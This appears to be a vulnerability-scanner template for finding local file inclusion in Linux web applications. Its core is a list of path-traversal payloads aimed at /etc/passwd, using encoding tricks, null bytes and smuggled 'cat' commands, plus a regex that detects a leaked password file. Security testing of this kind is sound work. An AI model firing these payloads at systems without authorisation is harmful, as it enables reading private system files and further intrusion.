http:
- fuzzing:
  - fuzz:
    - '{{nix_fuzz}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  payloads:
    nix_fuzz:
      high:
      - '%252e%252e%252fetc%252fpasswd%00'
      - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
      - '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00'
      - '....//....//etc/passwd'
      - ..///////..////..//////etc/passwd
      - /%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
      - '%0a/bin/cat%20/etc/passwd'
      - '%00/etc/passwd%00'
      - '%00../../../../../../etc/passwd'
      - /../../../../../../../../../../../etc/passwd%00.jpg
      - /../../../../../../../../../../../etc/passwd%00.html
      - /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
      - /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
      - \\&apos;/bin/cat%20/etc/passwd\\&apos;
      - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
      - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
      - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
      - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
      - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
      - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
      - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
      - /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
      low:
      - /etc/passwd
      - ../etc/passwd
      - ../../etc/passwd
      - ../../../etc/passwd
      - /../../../../etc/passwd
      - ../../../../../../../../../etc/passwd
      - ../../../../../../../../etc/passwd
      - ../../../../../../../etc/passwd
      - ../../../../../../etc/passwd
      - ../../../../../etc/passwd
      medium:
      - ../../../../etc/passwd
      - ../../../etc/passwd
      - ../../../etc/passwd%00
      - ../../../../../../../../../../../../etc/passwd%00
      - ../../../../../../../../../../../../etc/passwd
      - /../../../../../../../../../../etc/passwd^^
      - /../../../../../../../../../../etc/passwd
      - /./././././././././././etc/passwd
      - \..\..\..\..\..\..\..\..\..\..\etc\passwd
      - ..\..\..\..\..\..\..\..\..\..\etc\passwd
      - /..\../..\../..\../..\../..\../..\../etc/passwd
      - .\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
      - \..\..\..\..\..\..\..\..\..\..\etc\passwd%00
      - ..\..\..\..\..\..\..\..\..\..\etc\passwd%00
      - '%252e%252e%252fetc%252fpasswd'
  pre-condition:
  - dsl:
    - method == "GET"
    type: dsl
  stop-at-first-match: true
id: linux-lfi-fuzz
info:
  author: DhiyaneshDK
  metadata:
    max-request: 46
  name: Local File Inclusion - Linux
  reference:
  - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/Intruder/directory_traversal.txt
  - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
  severity: high
  tags: lfi,dast,linux,vuln
